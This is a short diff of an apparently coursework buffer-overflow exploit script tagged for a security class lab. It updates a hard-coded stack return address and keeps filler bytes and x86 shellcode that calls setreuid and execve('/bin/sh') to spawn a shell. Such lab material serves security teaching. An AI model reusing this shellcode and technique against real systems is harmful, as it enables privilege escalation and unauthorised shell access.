@@ -13,7 +13,9 @@ def revert(txt):
 
 
 fill = "0123456789abcdef0123456789abcdef01234567"
-raddr = "bffffa40" # "bffffa40"
+#cs161-ace# raddr = "bffffa40"
+#cs161-atw# raddr = "bffffad0"
+raddr = "bffffad0"
 #shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
 shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
 ########################################################################################### <- append an endline (0x0a, \n)
